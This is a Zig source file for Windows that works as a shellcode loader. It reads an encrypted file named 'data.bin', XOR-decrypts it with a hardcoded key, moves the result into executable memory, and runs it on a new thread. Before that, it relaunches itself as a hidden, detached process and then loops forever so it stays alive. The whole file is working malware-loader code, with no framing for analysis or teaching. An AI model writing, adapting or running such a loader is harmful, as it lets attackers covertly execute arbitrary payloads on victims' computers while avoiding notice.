const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

extern "kernel32" fn VirtualProtect(
    lpAddress: windows.LPVOID,
    dwSize: windows.SIZE_T,
    flNewProtect: windows.DWORD,
    lpflOldProtect: *windows.DWORD,
) callconv(WINAPI) windows.BOOL;

extern "kernel32" fn Sleep(dwMilliseconds: windows.DWORD) callconv(WINAPI) void;

extern "kernel32" fn CreateThread(
    lpThreadAttributes: ?*anyopaque,
    dwStackSize: windows.SIZE_T,
    lpStartAddress: windows.LPTHREAD_START_ROUTINE,
    lpParameter: ?windows.LPVOID,
    dwCreationFlags: windows.DWORD,
    lpThreadId: ?*windows.DWORD,
) callconv(WINAPI) ?windows.HANDLE;

extern "kernel32" fn WaitForSingleObject(
    hHandle: windows.HANDLE,
    dwMilliseconds: windows.DWORD,
) callconv(WINAPI) windows.DWORD;

extern "kernel32" fn GetCommandLineA() callconv(WINAPI) windows.LPSTR;

extern "kernel32" fn ExitProcess(exit_code: windows.UINT) callconv(WINAPI) noreturn;

const STARTUPINFOA = extern struct {
    cb: windows.DWORD,
    lpReserved: ?windows.LPSTR,
    lpDesktop: ?windows.LPSTR,
    lpTitle: ?windows.LPSTR,
    dwX: windows.DWORD,
    dwY: windows.DWORD,
    dwXSize: windows.DWORD,
    dwYSize: windows.DWORD,
    dwXCountChars: windows.DWORD,
    dwYCountChars: windows.DWORD,
    dwFillAttribute: windows.DWORD,
    dwFlags: windows.DWORD,
    wShowWindow: windows.WORD,
    cbReserved2: windows.WORD,
    lpReserved2: ?*windows.BYTE,
    hStdInput: ?windows.HANDLE,
    hStdOutput: ?windows.HANDLE,
    hStdError: ?windows.HANDLE,
};

const PROCESS_INFORMATION = extern struct {
    hProcess: windows.HANDLE,
    hThread: windows.HANDLE,
    dwProcessId: windows.DWORD,
    dwThreadId: windows.DWORD,
};

extern "kernel32" fn CreateProcessA(
    lpApplicationName: ?windows.LPCSTR,
    lpCommandLine: ?windows.LPSTR,
    lpProcessAttributes: ?*anyopaque,
    lpThreadAttributes: ?*anyopaque,
    bInheritHandles: windows.BOOL,
    dwCreationFlags: windows.DWORD,
    lpEnvironment: ?*anyopaque,
    lpCurrentDirectory: ?windows.LPCSTR,
    lpStartupInfo: *STARTUPINFOA,
    lpProcessInformation: *PROCESS_INFORMATION,
) callconv(WINAPI) windows.BOOL;

const DETACHED_PROCESS: windows.DWORD = 0x00000008;
const CREATE_NO_WINDOW: windows.DWORD = 0x08000000;

const xor_key = [_]u8{ 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE };

fn decrypt_shellcode(encrypted: []const u8, allocator: std.mem.Allocator) ![]u8 {
    var decrypted = try allocator.alloc(u8, encrypted.len);
    
    for (encrypted, 0..) |byte, i| {
        const key_byte = xor_key[i % xor_key.len];
        decrypted[i] = byte ^ key_byte;
    }
    
    return decrypted;
}

fn execute_payload() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    const file = try std.fs.cwd().openFile("data.bin", .{});
    defer file.close();
    
    const file_size = try file.getEndPos();
    const encrypted_data = try allocator.alloc(u8, file_size);
    defer allocator.free(encrypted_data);
    
    _ = try file.readAll(encrypted_data);
    
    const shellcode = try decrypt_shellcode(encrypted_data, allocator);
    defer allocator.free(shellcode);
    
    const kernel32 = windows.kernel32;
    
    const mem = kernel32.VirtualAlloc(
        null,
        shellcode.len,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    ) orelse return error.AllocationFailed;
    
    @memcpy(@as([*]u8, @ptrCast(mem))[0..shellcode.len], shellcode);
    
    var old_protect: windows.DWORD = undefined;
    _ = VirtualProtect(
        mem,
        shellcode.len,
        windows.PAGE_EXECUTE_READ,
        &old_protect,
    );
    
    var thread_id: windows.DWORD = undefined;
    const thread_handle = CreateThread(
        null,
        0,
        @ptrCast(mem),
        null,
        0,
        &thread_id,
    );
    
    if (thread_handle) |handle| {
        _ = WaitForSingleObject(handle, windows.INFINITE);
    }
    
    while (true) {
        Sleep(10000);
    }
}

fn is_already_detached() bool {
    const cmd = GetCommandLineA();
    const cmd_line = std.mem.span(cmd);
    return std.mem.indexOf(u8, cmd_line, "--detached") != null;
}

pub fn main() !void {
    if (is_already_detached()) {
        Sleep(2000);
        try execute_payload();
    } else {
        var cmd_line_buf: [1024]u8 = undefined;
        const exe_path = try std.fs.selfExePathAlloc(std.heap.page_allocator);
        defer std.heap.page_allocator.free(exe_path);
        
        const cmd_line = try std.fmt.bufPrintZ(&cmd_line_buf, "\"{s}\" --detached", .{exe_path});
        
        var startup_info: STARTUPINFOA = std.mem.zeroes(STARTUPINFOA);
        startup_info.cb = @sizeOf(STARTUPINFOA);
        
        var process_info: PROCESS_INFORMATION = undefined;
        
        const result = CreateProcessA(
            null,
            @constCast(cmd_line.ptr),
            null,
            null,
            0,
            DETACHED_PROCESS | CREATE_NO_WINDOW,
            null,
            null,
            &startup_info,
            &process_info,
        );
        
        if (result != 0) {
            ExitProcess(0);
        } else {
            return error.ProcessCreationFailed;
        }
    }
}